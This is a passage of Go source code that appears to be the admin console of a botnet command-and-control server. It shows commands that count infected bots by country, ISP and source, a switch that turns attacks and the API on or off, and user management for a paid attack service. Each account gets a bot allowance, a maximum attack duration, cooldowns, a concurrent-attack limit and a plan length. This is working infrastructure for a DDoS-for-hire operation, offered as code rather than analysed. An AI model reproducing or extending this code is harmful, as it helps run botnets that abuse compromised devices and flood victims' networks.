			this.conn.Write([]byte("\x1b[38;5;99mUsage:\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  bots           Show bot counts by source type\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  bots -c        Show top 15 Countries (from GeoIP)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  bots -a        Show top 15 ISP / ASN (from GeoIP)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  bots -s        Show by source type with deltas\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27m  bots help      Show this help message\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m________________________________________\r\n"))
			this.conn.Write([]byte("\x1b[38;5;27mFormat: [ total | +new | -lost ] since last check\r\n"))
			return true
		}

		botCount := clientList.Count()
		typeCounts := clientList.Distribution()
		availableCounts := clientList.Available()
		totalBots := botCount

		switch {
		case showCountry:
			countStats := make(map[string]int)
			clients := clientList.AllClients()
			for _, bot := range clients {
				countStats[bot.CountryLabel()]++
			}
			stats := clientList.CountryStats(countStats)

			type kv struct {
				Key   string
				Total int
				New   int
				Lost  int
			}
			var sorted []kv
			for k, v := range stats {
				clean := strings.Trim(k, " :\t\n\"'")
				if clean == "" { clean = "unknown" }
				sorted = append(sorted, kv{clean, v[0], v[1], v[2]})
			}
			sort.Slice(sorted, func(i, j int) bool { return sorted[i].Total > sorted[j].Total })
			if len(sorted) > 15 { sorted = sorted[:15] }

			for _, entry := range sorted {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%-22s \x1b[38;5;231m: [ \x1b[38;5;27m%d\x1b[38;5;231m | \x1b[38;5;82m+%d\x1b[38;5;231m | \x1b[38;5;196m-%d\x1b[38;5;231m ]\r\n",
					entry.Key, entry.Total, entry.New, entry.Lost)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m\r\nTotal Countries: \x1b[38;5;27m%d\r\n", len(stats))))

		case showASN:
			asnStats := make(map[string]int)
			clients := clientList.AllClients()
			for _, bot := range clients {
				asnStats[bot.ASNLabel()]++
			}
			stats := clientList.ASNStats(asnStats)

			type kv struct {
				Key   string
				Total int
				New   int
				Lost  int
			}
			var sorted []kv
			for k, v := range stats {
				clean := strings.Trim(k, " :\t\n\"'")
				if clean == "" { clean = "unknown" }
				sorted = append(sorted, kv{clean, v[0], v[1], v[2]})
			}
			sort.Slice(sorted, func(i, j int) bool { return sorted[i].Total > sorted[j].Total })
			if len(sorted) > 15 { sorted = sorted[:15] }

			for _, entry := range sorted {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%-48s \x1b[38;5;231m: [ \x1b[38;5;27m%d\x1b[38;5;231m | \x1b[38;5;82m+%d\x1b[38;5;231m | \x1b[38;5;196m-%d\x1b[38;5;231m ]\r\n",
					entry.Key, entry.Total, entry.New, entry.Lost)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m\r\nTotal ASN's: \x1b[38;5;27m%d\r\n", len(stats))))

		case showSource:
			sourceStats := make(map[string]int)
			clients := clientList.AllClients()
			for _, bot := range clients {
				sourceStats[bot.source]++
			}
			stats := clientList.CountryStats(sourceStats)
			for srcKey, v := range stats {
				label := strings.Trim(srcKey, " :\t\n\"'")
				if label == "" { label = "unknown" }
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%-22s \x1b[38;5;231m: [ \x1b[38;5;27m%d\x1b[38;5;231m | \x1b[38;5;82m+%d\x1b[38;5;231m | \x1b[38;5;196m-%d\x1b[38;5;231m ]\r\n",
					label, v[0], v[1], v[2])))
			}

		default:
			aggregated := make(map[string]int)

			for bt, c := range typeCounts {
				// ✅ REMOVE ALL LEADING COLONS + SPACES COMPLETELY
				clean := strings.TrimLeft(bt, " :\t\"'")
				for strings.HasPrefix(clean, ":") || strings.HasPrefix(clean, " ") {
					clean = strings.TrimLeft(clean, " :\t\"'")
				}
				// Also trim from end
				clean = strings.TrimSpace(clean)
				if clean == "" {
					clean = "unknown"
				}
				aggregated[clean] += c
			}

			type botStat struct {
				botType    string
				total      int
				available  int
				percentage float64
			}

			var stats []botStat
			for label, t := range aggregated {
				if t == 0 { continue }
				av := availableCounts[label]
				pct := 0.0
				if totalBots > 0 {
					pct = float64(t) / float64(totalBots) * 100
				}
				stats = append(stats, botStat{label, t, av, pct})
			}

			// Sort by total count DESC
			sort.Slice(stats, func(i, j int) bool {
				return stats[i].total > stats[j].total
			})

			// Clean output: name: count
			for _, s := range stats {
				line := fmt.Sprintf(
					"\x1b[38;5;99m%s\x1b[0m: \x1b[38;5;27m%d\x1b[0m\r\n",
					s.botType, s.total,
				)
				this.conn.Write([]byte(line))
			}
		}

		this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mTotal: \x1b[38;5;27m%d\r\n", botCount)))
		return true
	}


	if strings.HasPrefix(lower, "broadcast") {
		msg := strings.TrimSpace(strings.TrimPrefix(cmd, parts[0]))
		if msg == "" {
			this.conn.Write([]byte("\x1b[38;5;99musage: broadcast <message>\r\n"))
			return true
		}
		n := sessions.Broadcast(adminName, msg)
		this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mBroadcast sent to %d users\r\n", n)))
		return true
	}

	if strings.HasPrefix(lower, "attacks") {
		if len(parts) < 2 {
			this.conn.Write([]byte("\x1b[38;5;99musage: attacks enable|disable\r\n"))
			return true
		}
		switch strings.ToLower(parts[1]) {
		case "disable", "off":
			if err := database.SetAttacksEnabled(false); err != nil {
				this.conn.Write([]byte("\x1b[38;5;99mFailed to disable attacks\r\n"))
			} else {
				this.conn.Write([]byte("\x1b[38;5;27mAttacks disabled\r\n"))
			}
		case "enable", "on":
			if err := database.SetAttacksEnabled(true); err != nil {
				this.conn.Write([]byte("\x1b[38;5;99mFailed to enable attacks\r\n"))
			} else {
				this.conn.Write([]byte("\x1b[38;5;27mAttacks enabled\r\n"))
			}
		default:
			this.conn.Write([]byte("\x1b[38;5;99musage: attacks enable|disable\r\n"))
		}
		return true
	}

	if lower == "api" || strings.HasPrefix(lower, "api ") {
		if len(parts) < 2 {
			this.conn.Write([]byte("\x1b[38;5;99musage: api enable|disable\r\n"))
			return true
		}
		switch strings.ToLower(parts[1]) {
		case "disable", "off":
			if err := database.SetApiEnabled(false); err != nil {
				this.conn.Write([]byte("\x1b[38;5;99mFailed to disable API\r\n"))
			} else {
				this.conn.Write([]byte("\x1b[38;5;27mAPI disabled\r\n"))
			}
		case "enable", "on":
			if err := database.SetApiEnabled(true); err != nil {
				this.conn.Write([]byte("\x1b[38;5;99mFailed to enable API\r\n"))
			} else {
				this.conn.Write([]byte("\x1b[38;5;27mAPI enabled\r\n"))
			}
		default:
			this.conn.Write([]byte("\x1b[38;5;99musage: api enable|disable\r\n"))
		}
		return true
	}

	if lower == "users" || strings.HasPrefix(lower, "users ") {
		this.handleUsers(parts, adminName)
		return true
	}
	return false
}

func (this *Admin) handleUsers(parts []string, adminName string) {
	if len(parts) == 1 {
		this.listUsers()
		return
	}

	switch strings.ToLower(parts[1]) {
	case "add":
		this.usersAdd()
	case "remove":
		if len(parts) < 3 {
			this.conn.Write([]byte("\x1b[38;5;99musage: users remove <username>\r\n"))
			return
		}
		target := parts[2]
		if target == adminName {
			this.conn.Write([]byte("\x1b[38;5;99mYou cannot remove yourself\r\n"))
			return
		}
		if !database.removeUser(target) {
			this.conn.Write([]byte("\x1b[38;5;99mUser not found\r\n"))
			return
		}
		sessions.Kick(target, "Your account was removed")
		this.conn.Write([]byte("\x1b[38;5;27mUser removed\r\n"))
	case "ban":
		if len(parts) < 3 {
			this.conn.Write([]byte("\x1b[38;5;99musage: users ban <username> <reason>\r\n"))
			return
		}
		target := parts[2]
		if target == adminName {
			this.conn.Write([]byte("\x1b[38;5;99mYou cannot ban yourself\r\n"))
			return
		}
		reason := strings.Join(parts[3:], " ")
		if reason == "" {
			reason = "no reason given"
		}
		if err := database.BanUser(target, reason); err != nil {
			this.conn.Write([]byte("\x1b[38;5;99m" + err.Error() + "\r\n"))
			return
		}
		sessions.Kick(target, "You are banned: "+reason)
		this.conn.Write([]byte("\x1b[38;5;27mUser banned\r\n"))
	case "edit":
		this.usersEdit(parts)
	default:
		this.conn.Write([]byte("\x1b[38;5;99musage: users <add/remove/edit/ban> [options]\r\n"))
	}
}

func (this *Admin) listUsers() {
	users := database.ListUsers()

	this.conn.Write([]byte("\x1b[38;5;99mUSERNAME    | ADMIN | CONNS | MAXTIME | COOLDOWN | EXPIRY     | BANNED | API\r\n"))
	this.conn.Write([]byte("\x1b[38;5;27m------------|-------|-------|---------|----------|------------|--------|-----\r\n"))

	for _, u := range users {
		admin := "false"
		if u.Admin == 1 {
			admin = "true"
		}
		banned := "No"
		if u.Banned {
			banned = "Yes"
		}
		api := "false"
		if u.ApiAccess {
			api = "true"
		}
		conc := "full"
		if u.MaxConcurrent == 0 {
			conc = "1"
		} else if u.MaxConcurrent > 0 {
			conc = strconv.Itoa(u.MaxConcurrent)
		}
		maxTime := "0"
		if u.DurationLimit != 0 {
			maxTime = strconv.Itoa(int(u.DurationLimit))
		}
		cooldown := strconv.Itoa(u.Cooldown)
		expiry := planLabel(u)
		if expiry == "" {
			expiry = "unlimited"
		}
		this.conn.Write([]byte(fmt.Sprintf(
			"\x1b[38;5;27m%-11s | %-5s | %-5s | %-7s | %-8s | %-10s | %-6s | %-4s\r\n",
			u.Username, admin, conc, maxTime, cooldown, expiry, banned, api,
		)))
	}

	this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mTotal users: \x1b[38;5;27m%d\r\n", len(users))))
}

func (this *Admin) usersAdd() {
	prompt := func(q string) (string, error) {
		this.conn.Write([]byte("\x1b[38;5;99m" + q))
		return this.ReadLine(false)
	}

	newUn, err := prompt("Enter New Username: ")
	if err != nil {
		return
	}
	newPw, err := prompt("Choose New Password: ")
	if err != nil {
		return
	}
	adminStr, err := prompt("Is this user an admin? (y/n): ")
	if err != nil {
		return
	}
	isAdmin := strings.EqualFold(adminStr, "y") || strings.EqualFold(adminStr, "yes")

	apiStr, err := prompt("API access? (y/n): ")
	if err != nil {
		return
	}
	apiAccess := strings.EqualFold(apiStr, "y") || strings.EqualFold(apiStr, "yes")

	maxBotsStr, err := prompt("Enter Bot Count (-1 for Full Bots): ")
	if err != nil {
		return
	}
	maxBots, err := strconv.Atoi(maxBotsStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to parse bot count\r\n"))
		return
	}

	durationStr, err := prompt("Max Attack Duration: ")
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to parse duration\r\n"))
		return
	}

	cooldownStr, err := prompt("Cooldown: ")
	if err != nil {
		return
	}
	cooldown, err := strconv.Atoi(cooldownStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to parse cooldown\r\n"))
		return
	}

	concStr, err := prompt("Max Concurrent Attacks: ")
	if err != nil {
		return
	}
	maxConc, err := strconv.Atoi(concStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to parse concurrent attacks\r\n"))
		return
	}

	daysStr, err := prompt("Plan duration in days (0 for unlimited): ")
	if err != nil {
		return
	}
	planDays, err := strconv.Atoi(daysStr)
	if err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to parse plan days\r\n"))
		return
	}

	adminLabel := "no"
	if isAdmin {
		adminLabel = "yes"
	}
	apiLabel := "no"
	if apiAccess {
		apiLabel = "yes"
	}
	this.conn.Write([]byte("\x1b[38;5;99mNew Account Info:\r\n"))
	this.conn.Write([]byte("Username: " + newUn + "\r\n"))
	this.conn.Write([]byte("Password: " + newPw + "\r\n"))
	this.conn.Write([]byte("Admin: " + adminLabel + "\r\n"))
	this.conn.Write([]byte("API: " + apiLabel + "\r\n"))
	this.conn.Write([]byte("Botcount: " + maxBotsStr + "\r\n"))
	this.conn.Write([]byte("Duration: " + durationStr + "\r\n"))
	this.conn.Write([]byte("Cooldown: " + cooldownStr + "\r\n"))
	this.conn.Write([]byte("Concurrent: " + concStr + "\r\n"))
	this.conn.Write([]byte("Days: " + daysStr + "\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99mContinue? (Y/N): "))
	confirm, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if !strings.EqualFold(confirm, "y") && !strings.EqualFold(confirm, "yes") {
		this.conn.Write([]byte("\x1b[38;5;99mCancelled\r\n"))
		return
	}

	if err := database.CreateAccount(CreateUserRequest{
		Username:      newUn,
		Password:      newPw,
		MaxBots:       maxBots,
		Duration:      duration,
		Cooldown:      cooldown,
		Admin:         isAdmin,
		MaxConcurrent: maxConc,
		PlanDays:      planDays,
		ApiAccess:     apiAccess,
	}); err != nil {
		this.conn.Write([]byte("\x1b[38;5;99mFailed to create user: " + err.Error() + "\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[38;5;27mUser added successfully\r\n"))
}

func (this *Admin) usersEdit(parts []string) {
	if len(parts) < 4 {
		this.conn.Write([]byte("\x1b[38;5;99musage: users edit <username> <maxtime|cooldown|days|api|botcount|conc|cons|con|concurrent|slots|admin|password> <add|remove|set|true|false|number> [...]\r\n"))
		return
	}
	username := parts[2]
	field := parts[3]
	op := ""
	value := ""
	if len(parts) >= 5 {
		op = parts[4]
	}
	if len(parts) >= 6 {
		value = strings.Join(parts[5:], " ")
	}

	fl := strings.ToLower(field)
	if (fl == "admin" || fl == "api") && op == "" {
		this.conn.Write([]byte("\x1b[38;5;99musage: users edit <username> " + fl + " true|false\r\n"))
		return
	}
	if (fl == "conc" || fl == "cons" || fl == "con" || fl == "concurrent" || fl == "slots") && op != "" && value == "" {
		if _, err := strconv.Atoi(op); err == nil {
			op = "set"
			value = parts[4]
		}
	}

	if err := database.EditUser(username, field, op, value); err != nil {
		this.conn.Write([]byte("\x1b[38;5;99m" + err.Error() + "\r\n"))
		return
	}
	this.conn.Write([]byte("\x1b[38;5;27mUser updated\r\n"))
}

func (this *Admin) writeInfo(username string, userInfo AccountInfo) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;37mACCOUNT INFO\x1b[0m\r\n\r\n"))

	u, ok := database.GetUser(username)
	if !ok {
		this.conn.Write([]byte("\x1b[38;5;99mCould not load account info\r\n"))
		return
	}

	role := "User"
	if u.Admin == 1 {
		role = "Admin"
	}
	status := "Offline"
	if sessions.IsOnline(u.Username) {
		status = "Online"
	}
	api := "no"
	if u.ApiAccess {
		api = "yes"
	}
	bots := strconv.Itoa(u.MaxBots)
	if u.MaxBots == -1 {
		bots = "full"
	}
	conc := strconv.Itoa(u.MaxConcurrent)
	if u.MaxConcurrent == -1 {
		conc = "full"
	} else if u.MaxConcurrent == 0 {
		conc = "1"
	}
	maxTime := "unlimited"
	if u.DurationLimit != 0 {
		maxTime = strconv.Itoa(int(u.DurationLimit)) + "s"
	}
	running := database.fetchUserRunningAttacks(username)
	sent := database.fetchUserAttackCount(username)

	line := func(label, value string) {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m %-14s \x1b[38;5;27m%s\r\n", label, value)))
	}

	line("Username", u.Username)
	line("Role", role)
	line("Status", status)
	line("Plan", planLabel(u))
	line("API access", api)
	line("Max bots", bots)
	line("Max time", maxTime)
	line("Cooldown", strconv.Itoa(u.Cooldown)+"s")
	line("Concurrent", conc)
	line("Running now", strconv.Itoa(running))
	line("Attacks sent", strconv.Itoa(sent))
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
